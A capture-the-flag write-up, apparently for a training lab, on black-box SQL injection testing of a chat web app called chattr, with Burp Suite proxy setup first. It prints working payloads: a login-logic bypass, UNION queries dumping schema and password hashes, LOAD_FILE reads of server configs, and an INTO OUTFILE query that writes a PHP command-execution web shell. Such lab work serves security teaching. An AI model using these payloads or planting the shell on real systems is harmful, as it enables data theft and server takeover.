## Scenario

You have been hired by `chattr GmbH` to perform a penetration test of their web application. In light of a recent breach of one of their main competitors, they are particularly concerned about `SQL injection vulnerabilities` and the damage that the discovery and successful exploitation of this attack could cause to their public image and bottom line.

They provided a target IP address and no additional information about their website. Perform an assessment focused specifically on testing SQL injection vulnerabilities in the web application from a “black-box” approach.

![Chattr login page with fields for username and password, login button, and a person talking on the phone in an office.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/sa/1.png)

---

## Intercepting HTTPS Traffic with Burp Suite

The web application in this skills assessment uses `HTTPS`, which `Burp Suite` cannot intercept by default. To do so, you must either install `Burp Suite's Certificate Authority (CA)` in your browser or use the `integrated browser in Burp Suite`.

### Option 1: Using Burp Suite’s Integrated Browser (Chromium)

One way to intercept traffic to websites using HTTPS is to use the built-in browser in Burp Suite. To do this, simply navigate to the `Proxy` tab and click `Open browser`. In addition to intercepting HTTPS traffic, the integrated browser includes a few Burp Suite extensions preinstalled, such as [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader), which is useful for identifying DOM-based XSS.

![Burp Suite shows an intercepted POST request to chatr's login page with the username 'jsmith' and the password field filled in.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/sa/2.png)

### Option 2: Installing the PortSwigger CA in Your Own Browser

Another way to intercept traffic to websites using HTTPS is to install Burp Suite’s CA in the web browser of your choice. PortSwigger has an [article](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate) documenting the process for `Chrome`, `Firefox`, and `Safari`. For example, let’s see how it works in `Firefox`.

After configuring your browser to use Burp Suite as a proxy (default: `http://localhost:8080`), go to `http://burpsuite`. You should see the following page:

![Burp Suite Community Edition welcome page with CA Certificate button.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/sa/3.png)

Click `CA Certificate` and save `cacert.der` to a known location. This is `Burp Suite's CA` that you will need to import into `Firefox` so the browser trusts the proxy.

Next, go to `Settings` and search for `"Certificates"`. You will need to click the `View Certificates...` button shown below:

![Firefox settings search results for 'certi' with options to view certificates and security devices.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/sa/4.png)

Inside the `Certificate Manager` dialog, open the `Authorities` tab and click `Import`. Select the `cacert.der` file we just downloaded, check both boxes, and click `Ok` to import the CA.

![Firefox Certificate Manager on the Authorities tab, importing a certificate with options to trust CA for websites and email users, Ok button highlighted.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/sa/5.png)

Then we can use the Firefox extension [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) to quickly and easily switch Firefox proxy settings. This extension is preinstalled on your PwnBox instance and can be installed in your own Firefox browser by visiting the [Firefox extensions page](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and clicking `Add to Firefox`.

Once the extension is added, we can configure the web proxy by clicking its icon in the top bar and selecting `Options`:

![FoxyProxy menu with options for "Options", "What's my IP?" and "Log"](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/sa/6.png)

On the `Options` page, click `Add` on the left panel and use `127.0.0.1` as the IP and `8080` as the port, name it `Burp`, and click `Save`:

![Edit Proxy Burp/ZAP settings. Fields for title, color, proxy type, IP address, port, username, and password. Buttons for Cancel, Save & add another, Save & edit patterns, Save.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/sa/7.png)

Finally, click the `FoxyProxy` add-on icon and select `Burp`:

![FoxyProxy menu with Burp/ZAP enabled. Options for "Options", "What's my IP?" and "Log"](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/sa/8.png)

Once this is done, we should now be able to intercept HTTPS traffic in Burp Suite without any issues.

![Burp Suite intercepts the POST request to chatr's login page with the username 'jsmith' and the password field filled in.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/sa/9.png)

---

## Bypassing User Registration via SQL Injection

During the registration process, the application requires an **invitation code** to allow the creation of new accounts.
The application itself provides an **example of the expected format** for that code, which suggests that the input value is validated directly against an SQL query.

When intercepting the request using **Burp Suite**, we observe that the invitation code parameter is vulnerable to **SQL injection**.
To confirm this, we inject a logical condition that always evaluates to true:

`' OR '1'='1`

This payload alters the logic of the original query, causing the invitation code validation to always evaluate as true, since the condition `1=1` is always satisfied.

As a result, the system accepts the invitation code without properly validating it, allowing us to **bypass the registration mechanism** and successfully create a user account.

<img src="/budahacksecurity_static/uploads/md_images/database/sql.png" style="max-width:100%; border-radius:8px;">

---

## Identifying SQL Injection Vulnerability (UNION-based)

During the **admin user search** functionality, we observed abnormal behavior in the chat response, suggesting the presence of a **UNION-based SQL injection**.

---

### Identifying the Number of Columns

To determine the number of columns used in the original SQL query, we send the following payload:

```sql
admin') UNION SELECT 1,2,3,4-- -
```

The application returns the value **3**, indicating that:

* The original query is composed of **4 columns**
* The **third column** is the one reflected in the chat output

This confirms that any information we want to extract must be injected into **column 3** in order to be visible.

---

### Identifying the Database Management System (DBMS)

Once the vulnerability is confirmed, we identify the DBMS using the following payload:

```sql
admin') UNION SELECT 1,2,@@version,4-- -
```

The application returns:

```sql
10.11.11-MariaDB-0+deb12u1
```

This confirms the backend is running **MariaDB**, which is compatible with **MySQL** syntax.

---

### Enumerating Databases

Now that we know the DBMS and the reflected column, we enumerate available databases using `INFORMATION_SCHEMA.SCHEMATA`:

```sql
admin') UNION SELECT 1,2,schema_name,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

The application displays the following databases:

* `information_schema`
* `chattr`

Since `information_schema` is an internal system database, we infer that **`chattr` corresponds to the database used by the web application**.

To confirm this, we use the `database()` function:

```sql
admin') UNION SELECT 1,2,database(),4-- -
```

The response is:

`chattr`

This explicitly confirms that **`chattr` is the currently used database** by the application, validating it as the correct target for further table and column enumeration.

---

## Enumerating Tables and Columns

Once the application database (`chattr`) is identified, we proceed to enumerate its tables.

We use `INFORMATION_SCHEMA.TABLES`, which stores information about all tables in the DBMS. The following payload lists table names belonging to `chattr`:

```sql
admin') UNION SELECT 1,2,TABLE_NAME,4 FROM INFORMATION_SCHEMA.TABLES 
WHERE table_schema='chattr'-- -
```

<img src="/budahacksecurity_static/uploads/md_images/database/sql2.png" style="max-width:100%; border-radius:8px;">

---

From the image above, we can see that we obtain **3 tables**: `Users`, `InvitationCodes`, and `Messages`.

---

After identifying a potentially sensitive table (`Users`), we enumerate its columns using `INFORMATION_SCHEMA.COLUMNS`:

```bash
admin') union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
```

<img src="/budahacksecurity_static/uploads/md_images/database/sql3.png" style="max-width:100%; border-radius:8px;">

---

The application response reveals that the `Users` table contains the following columns:

* `UserID`
* `Username`
* `Password`
* `InvitationCode`
* `AccountCreated`

The presence of **`Username`** and **`Password`** indicates this table stores user credentials, while **`InvitationCode`** confirms the mechanism used during registration.
This makes the `Users` table a high-priority target for extracting sensitive information.

---

## Obtaining the Admin Password Hash

### Extracting Password Hashes

Once the `Users` table columns are identified, we extract values from the `Password` column, which contains **user password hashes**.

We do this again using UNION-based SQL injection, directly targeting the `Users` table inside the `chattr` database:

```sql
admin') UNION SELECT 1,2,Password,User FROM chattr.Users-- -
```

<img src="/budahacksecurity_static/uploads/md_images/database/sql4.png" style="max-width:100%; border-radius:8px;">

---

## Identifying the Web Root Path

To identify the web root path, we first need to confirm read permissions. Let’s check which database user the application is using:

```sql
admin') union select 1, 2, user(), 4-- -
```

We see that the database user is:

```sql
chattr_dbUser@localhost
```

---

### Enumerating Database User Privileges

To identify which privileges are assigned to the database user used by the application, we query `INFORMATION_SCHEMA.USER_PRIVILEGES`:

```sql
admin') UNION SELECT 1,2,privilege_type,4 FROM information_schema.user_privileges-- -
```

The application reveals the available privileges. We only obtain the **FILE** privilege.

Since we can read files and we already know this is an nginx server, we attempt to read its configuration file:

```sql
admin') union select 1, 2, LOAD_FILE("/etc/ginx/nginx.conf"), 4-- -
```

---

We see that the web root can be determined by reviewing `/etc/nginx/sites-enabled/default`:

```sql
admin') UNION SELECT  1 ,  2 ,  LOAD_FILE ( "/etc/nginx/sites-enabled/default" ),  4 -- -
```

Where we find the root path:

`root /var/www/chattr-prod`

---

## Web Shell

We execute the following payload:

```sql
admin') UNION SELECT 1, 2, variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Output:

```sql
SECURE_FILE_PRIV
```

We notice the value is empty, meaning we can write and read files from any location.

We upload the web shell:

```sql
admin') union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/chattr-prod/shell.php'-- -
```

We obtain the flag:

<img src="/budahacksecurity_static/uploads/md_images/database/sql5.png" style="max-width:100%; border-radius:8px;">

---
